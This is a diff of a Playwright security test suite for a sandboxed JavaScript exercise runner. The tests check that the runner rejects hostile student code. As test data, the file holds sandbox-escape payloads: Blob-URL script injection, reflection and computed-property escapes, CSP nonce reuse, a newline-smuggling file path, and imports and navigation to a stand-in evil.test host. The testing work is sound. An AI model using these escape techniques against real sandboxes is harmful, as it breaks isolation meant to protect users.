@@ -1,7 +1,11 @@
 import { expect, test, type Page } from '@playwright/test';
 import { readFile } from 'node:fs/promises';
 import type { JavaScriptRunnerAdapter as JavaScriptRunnerAdapterType } from '../../src/adapters/runtime/javascript';
-import type { RunnerConsoleRecord, RunnerDiagnostic } from '../../src/core/runtime/contracts';
+import type {
+  RunnerConsoleRecord,
+  RunnerDiagnostic,
+  RunnerEvidence,
+} from '../../src/core/runtime/contracts';
 import {
   JAVASCRIPT_SOLUTION_SOURCE,
   openEditableJavaScriptExercise,
@@ -10,6 +14,7 @@ import {
   observeStableTopUrl,
   observeRuntimePage,
   readRuntimeErrors,
+  takeConsoleErrors,
 } from './helpers/openRuntimeFixture';
 import { editorText, replaceEditorText, waitForStoredDraftContent } from './helpers/progress';
 import { testServerUrl } from './helpers/testBasePath';
@@ -32,17 +37,39 @@ const capabilityPayloads = [
   ['eval', "eval('console.log(1)');"],
   ['Function constructor', "Function('return 1')();"],
   ['dynamic import', "import('https://evil.test/module.js');"],
+  [
+    'Blob script injection',
+    `const name = 'src';
+const script = document.createElement('script');
+script.setAttribute(name, URL.createObjectURL(new Blob(["console.log('blob-injected')"])));
+document.querySelector('head').appendChild(script);`,
+  ],
   ['self navigation', "window.location = 'https://evil.test/navigation';"],
 ] as const;
 
-interface JavaScriptHarnessInput {
-  readonly source: string;
-  readonly capabilityProfile: 'core' | 'project';
-}
+type JavaScriptHarnessInput =
+  | {
+      readonly source: string;
+      readonly capabilityProfile: 'core' | 'modules' | 'dom' | 'async' | 'project';
+      readonly sourceType?: 'script';
+      readonly snapshotSelector?: string;
+      readonly waitBeforeSnapshotMs?: number;
+    }
+  | {
+      readonly files: Readonly<Record<string, string>>;
+      readonly entryFile: string;
+      readonly capabilityProfile: 'modules';
+      readonly sourceType: 'module';
+      readonly snapshotSelector?: string;
+      readonly waitBeforeSnapshotMs?: number;
+    };
 
 interface JavaScriptHarnessResult {
   readonly diagnostics: readonly RunnerDiagnostic[];
   readonly console: readonly RunnerConsoleRecord[];
+  readonly evidence: readonly RunnerEvidence[];
+  readonly rejection: string | null;
+  readonly snapshotText: string | null;
 }
 
 /** build済みVite manifestから、pageと同一originのJavaScript Runner entryを解決する。 */
@@ -88,29 +115,71 @@ async function runJavaScriptHarness(
         harnessWindow.__tsumucodeJavaScriptSecurityHarness = { runner, frame };
       }
       const { runner } = harnessWindow.__tsumucodeJavaScriptSecurityHarness;
-      const result = await runner.render({
-        exerciseSessionId: crypto.randomUUID(),
-        executionRevision: 1,
-        languageId: 'javascript',
-        files: {
-          'index.html':
-            '<!doctype html><html lang="ja"><body><h1 id="message">安全</h1></body></html>',
-          'styles.css': '',
-          'script.js': harnessInput.source,
-        },
-        assets: [],
-        viewport: { id: 'desktop', width: 1280, height: 720 },
-        options: {
-          runtime: {
-            kind: 'javascript',
-            entryFile: 'script.js',
-            sourceType: 'script',
-            capabilityProfile: harnessInput.capabilityProfile,
-            primaryOutput: 'console',
+      const moduleMode = harnessInput.sourceType === 'module';
+      try {
+        const exerciseSessionId = crypto.randomUUID();
+        const executionRevision = 1;
+        const result = await runner.render({
+          exerciseSessionId,
+          executionRevision,
+          languageId: 'javascript',
+          files: {
+            'index.html':
+              '<!doctype html><html lang="ja"><body><h1 id="message">安全</h1></body></html>',
+            'styles.css': '',
+            ...(moduleMode ? harnessInput.files : { 'script.js': harnessInput.source }),
           },
-        },
-      });
-      return { diagnostics: result.diagnostics, console: result.console };
+          assets: [],
+          viewport: { id: 'desktop', width: 1280, height: 720 },
+          options: {
+            runtime: {
+              kind: 'javascript',
+              entryFile: moduleMode ? harnessInput.entryFile : 'script.js',
+              sourceType: moduleMode ? 'module' : 'script',
+              capabilityProfile: harnessInput.capabilityProfile,
+              primaryOutput: 'console',
+            },
+          },
+        });
+        let snapshotText: string | null = null;
+        if (!moduleMode && harnessInput.snapshotSelector !== undefined) {
+          await new Promise((resolve) =>
+            window.setTimeout(resolve, harnessInput.waitBeforeSnapshotMs ?? 0),
+          );
+          const snapshot = await runner.requestSnapshot({
+            exerciseSessionId,
+            executionRevision,
+            requestId: crypto.randomUUID(),
+            policy: {
+              selectors: [harnessInput.snapshotSelector],
+              attributes: [],
+              computedStyles: [],
+              focusVisibleSelectors: [],
+              focusVisibleComputedStyles: [],
+              includeAllElements: false,
+            },
+          });
+          snapshotText =
+            snapshot.nodes.find(({ matchedSelectors }) =>
+              matchedSelectors.includes(harnessInput.snapshotSelector ?? ''),
+            )?.text ?? null;
+        }
+        return {
+          diagnostics: result.diagnostics,
+          console: result.console,
+          evidence: result.evidence,
+          rejection: null,
+          snapshotText,
+        };
+      } catch (error: unknown) {
+        return {
+          diagnostics: [],
+          console: [],
+          evidence: [],
+          rejection: error instanceof Error ? error.message : String(error),
+          snapshotText: null,
+        };
+      }
     },
     {
       input,
@@ -187,6 +256,97 @@ console.log('<img src=x onerror="document.body.dataset.pwned=1">');`,
   expect(await page.evaluate(() => document.body.dataset['pwned'] ?? null)).toBeNull();
 });
 
+test('static Module graphをopaque Previewで実行し、依存Sourceとgraph証跡を結び付ける', async ({
+  page,
+}) => {
+  const result = await runJavaScriptHarness(page, {
+    sourceType: 'module',
+    capabilityProfile: 'modules',
+    entryFile: 'src/main.js',
+    files: {
+      'src/main.js': "import { updateMessage } from './message.js'; updateMessage();",
+      'src/message.js': `export function updateMessage() {
+  document.querySelector('#message').textContent = 'Moduleで更新しました';
+  console.log('module-ok');
+}`,
+    },
+  });
+
+  expect(result.diagnostics).toEqual([]);
+  expect(result.console.map(({ text }) => text)).toEqual(['module-ok']);
+  expect(result.evidence).toContainEqual({ id: 'javascript.executed', value: true });
+  const graphEvidence = result.evidence.find(
+    ({ id }) => id === 'javascript.module-graph-sha256',
+  );
+  expect(graphEvidence?.value).toEqual(expect.stringMatching(/^[a-f0-9]{64}$/u));
+});
+
+test('不正なModule graphをfail-closedで拒否し、未解析コードを実行しない', async ({ page }) => {
+  const cases = [
+    {
+      name: 'bare import',
+      entryFile: 'src/main.js',
+      files: { 'src/main.js': "import 'left-pad';" },
+    },
+    {
+      name: 'unknown module',
+      entryFile: 'src/main.js',
+      files: { 'src/main.js': "import './missing.js';" },
+    },
+    {
+      name: 'path escape',
+      entryFile: 'src/main.js',
+      files: { 'src/main.js': "import '../../outside.js';" },
+    },
+    {
+      name: 'cycle',
+      entryFile: 'src/main.js',
+      files: {
+        'src/main.js': "import './cycle.js';",
+        'src/cycle.js': "import './main.js';",
+      },
+    },
+    {
+      name: 'dynamic import',
+      entryFile: 'src/main.js',
+      files: { 'src/main.js': "import('./other.js');" },
+    },
+  ] as const;
+
+  for (const item of cases) {
+    await test.step(item.name, async () => {
+      const result = await runJavaScriptHarness(page, {
+        sourceType: 'module',
+        capabilityProfile: 'modules',
+        entryFile: item.entryFile,
+        files: item.files,
+      });
+      expect(result.console).toEqual([]);
+      expect(result.rejection).toBeNull();
+      expect(result.diagnostics).toEqual([
+        expect.objectContaining({ kind: 'security', severity: 'error' }),
+      ]);
+      expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
+    });
+  }
+
+  const controlCharacterPath = await runJavaScriptHarness(page, {
+    sourceType: 'module',
+    capabilityProfile: 'modules',
+    entryFile: 'src/main.js',
+    files: {
+      'src/main.js': "import './evil.js\\nconsole.log(\\\"injected\\\")//.js';",
+      'src/evil.js\nconsole.log("injected")//.js': 'export const value = 1;',
+    },
+  });
+  expect(controlCharacterPath).toMatchObject({
+    diagnostics: [],
+    console: [],
+    evidence: [],
+    rejection: expect.stringMatching(/Preview file path must be safe/u),
+  });
+});
+
 test('Console floodと64KiB超をboundedに切り、runtime error前の記録を残して再試行できる', async ({
   page,
 }) => {
@@ -247,6 +407,208 @@ test('coreとprojectの両Profileで危険Capabilityをcode-errorとして拒否
         ).toBe(false);
       });
     }
+  }
+});
+
+test('全Profileでcomputed property runtime escapeをcode-errorとして拒否する', async ({
+  page,
+}) => {
+  const source = `const el = document.querySelector('#message');
+const d = el['owner' + 'Document'];
+const w = d['default' + 'View'];
+const s = d['create' + 'Element']('script');
+const blob = Reflect.construct(w['Blob'], [["console.log('blob-injected')"]]);
+s['set' + 'Attribute']('s' + 'rc', w['URL']['create' + 'ObjectURL'](blob));
+d['query' + 'Selector']('head')['append' + 'Child'](s);`;
+
+  for (const capabilityProfile of ['core', 'modules', 'dom', 'async', 'project'] as const) {
+    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
+    expect(result.rejection).toBeNull();
+    expect(result.console).toEqual([]);
+    expect(result.diagnostics).toEqual([
+      expect.objectContaining({ kind: 'security', severity: 'error' }),
+    ]);
+    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
+  }
+});
+
+test('全ProfileでObject reflection runtime escapeをcode-errorとして拒否する', async ({
+  page,
+}) => {
+  const source = `function descriptorFor(value, name) {
+  let prototype = value;
+  while (prototype !== null) {
+    const descriptor = Object.getOwnPropertyDescriptor(prototype, name);
+    if (descriptor !== undefined) return descriptor;
+    prototype = Object.getPrototypeOf(prototype);
+  }
+}
+const element = document.querySelector('#message');
+const owner = descriptorFor(element, 'ownerDocument').get.call(element);
+const view = descriptorFor(owner, 'defaultView').get.call(owner);
+const script = owner.createElement('script');
+const blob = view.Reflect.construct(view.Blob, [["console.log('reflection-injected')"]]);
+descriptorFor(script, 'setAttribute').value.call(script, 'src', view.URL.createObjectURL(blob));
+descriptorFor(owner.querySelector('head'), 'appendChild').value.call(
+  owner.querySelector('head'),
+  script,
+);`;
+
+  for (const capabilityProfile of ['core', 'modules', 'dom', 'async', 'project'] as const) {
+    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
+    expect(result.rejection).toBeNull();
+    expect(result.console).toEqual([]);
+    expect(result.diagnostics).toEqual([
+      expect.objectContaining({ kind: 'security', severity: 'error' }),
+    ]);
+    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
+  }
+});
+
+test('DOM許可ProfileでもCSP nonce再利用によるinline script注入をcode-errorとして拒否する', async ({
+  page,
+}) => {
+  const source = `const nonce=document.querySelector('script').nonce;
+const script=document.createElement('script');
+script.nonce=nonce;
+script.text="document.body.dataset.injected='yes'";
+document.querySelector('head').appendChild(script);`;
+
+  for (const capabilityProfile of ['dom', 'async', 'project'] as const) {
+    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
+    expect(result.rejection).toBeNull();
+    expect(result.console).toEqual([]);
+    expect(result.diagnostics).toEqual([
+      expect.objectContaining({ kind: 'security', severity: 'error' }),
+    ]);
+    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
+  }
+});
+
+test('学習コード開始時にはCSP metaとbootstrap scriptがDOMへ残らない', async ({ page }) => {
+  const result = await runJavaScriptHarness(page, {
+    capabilityProfile: 'dom',
+    source: `console.log(
+  document.querySelector('meta[http-equiv="Content-Security-Policy"]') === null,
+  document.querySelector('script') === null,
+);`,
+  });
+
+  expect(result.rejection).toBeNull();
+  expect(result.diagnostics).toEqual([]);
+  expect(result.console).toEqual([expect.objectContaining({ level: 'log', text: 'true true' })]);
+});
+
+test('CSP meta除去後も適用済みPolicyはnonceなしinline scriptを拒否する', async ({ page }) => {
+  const result = await page.evaluate(async () => {
+    const token = crypto.randomUUID();
+    return await new Promise<boolean>((resolve, reject) => {
+      const timeout = window.setTimeout(() => {
+        reject(new Error('CSP probe timed out'));
+      }, 2_000);
+      const onMessage = (event: MessageEvent<unknown>) => {
+        if (typeof event.data !== 'object' || event.data === null) return;
+        const data = event.data as Readonly<Record<string, unknown>>;
+        if (data['token'] !== token) return;
+        window.clearTimeout(timeout);
+        window.removeEventListener('message', onMessage);
+        resolve(data['injected'] === true);
+      };
+      window.addEventListener('message', onMessage);
+      const frame = document.createElement('iframe');
+      frame.setAttribute('sandbox', 'allow-scripts');
+      frame.srcdoc = `<!doctype html><meta http-equiv="Content-Security-Policy" content="script-src 'nonce-known'; script-src-attr 'none'"><script nonce="known">const token=${JSON.stringify(token)};document.querySelector('meta').remove();const current=document.currentScript;current.nonce='';current.removeAttribute('nonce');const injected=document.createElement('script');injected.textContent="parent.postMessage({token:'${token}',injected:true},'*')";document.head.append(injected);setTimeout(()=>parent.postMessage({token, injected:false},'*'),0);</script>`;
+      document.body.append(frame);
+    });
+  });
+
+  expect(result).toBe(false);
+  expect(takeConsoleErrors(page)).toEqual([
+    expect.stringMatching(/Content Security Policy|Content-Security-Policy|Refused to execute/u),
+  ]);
+});
+
+test('async timerはlockdown後も動作し、Object.keys改変後もtimer回収してSnapshotできる', async ({
+  page,
+}) => {
+  const result = await runJavaScriptHarness(page, {
+    capabilityProfile: 'async',
+    source: `Object.keys = () => [];
+setTimeout(() => {
+  document.querySelector('#message').textContent = 'timer-ok';
+}, 0);`,
+    snapshotSelector: '#message',
+    waitBeforeSnapshotMs: 50,
+  });
+
+  expect(result.rejection).toBeNull();
+  expect(result.diagnostics).toEqual([]);
+  expect(result.snapshotText).toBe('timer-ok');
+});
+
+test('legacy parentWindow経由でもasync Profile制限を迂回できない', async ({ page }) => {
+  const sources = [
+    "document.querySelector('body').getRootNode().parentWindow.setTimeout(() => {}, 0);",
+    "document.querySelector('body').getRootNode().parentWindow.Promise.resolve(1);",
+  ];
+  for (const capabilityProfile of ['core', 'modules', 'dom'] as const) {
+    for (const source of sources) {
+      const result = await runJavaScriptHarness(page, { capabilityProfile, source });
+      expect(result.rejection).toBeNull();
+      expect(result.diagnostics).toEqual([
+        expect.objectContaining({ kind: 'security', severity: 'error' }),
+      ]);
+      expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
+    }
+  }
+});
+
+test('待機後の実ユーザーEventでもcallback予算を更新してDOMを変更する', async ({ page }) => {
+  const result = await runJavaScriptHarness(page, {
+    capabilityProfile: 'dom',
+    source: `document.querySelector('#message').addEventListener('click', () => {
+  document.querySelector('#message').textContent = 'event-ok';
+});`,
+  });
+  expect(result.rejection).toBeNull();
+  expect(result.diagnostics).toEqual([]);
+
+  await page.waitForTimeout(350);
+  const harnessFrame = page.locator('iframe[title="JavaScriptコードのプレビュー"]').last();
+  await harnessFrame.evaluate((frame) => {
+    frame.style.pointerEvents = 'auto';
+    frame.style.opacity = '1';
+    frame.style.zIndex = '2147483647';
+  });
+  await harnessFrame.contentFrame().locator('#message').click();
+  await expect(harnessFrame.contentFrame().locator('#message')).toHaveText('event-ok');
+});
+
+test('同期Event dispatchとlistener自己再帰ではbudgetをresetせず安全に停止する', async ({
+  page,
+}) => {
+  const sources = [
+    `const element = document.querySelector('#message');
+element.addEventListener('click', () => {});
+while (true) element.click();`,
+    `const element = document.querySelector('#message');
+const recurse = () => {
+  const next = document.createElement('button');
+  next.addEventListener('click', recurse);
+  next.click();
+};
+element.addEventListener('click', recurse);
+element.click();`,
+  ];
+  for (const source of sources) {
+    const result = await runJavaScriptHarness(page, { capabilityProfile: 'dom', source });
+    expect(result.rejection).toBeNull();
+    expect(
+      result.diagnostics,
+      `${source}\n${JSON.stringify(result.evidence)}`,
+    ).toContainEqual(
+      expect.objectContaining({ kind: 'system', code: 'javascript-budget' }),
+    );
   }
 });
 
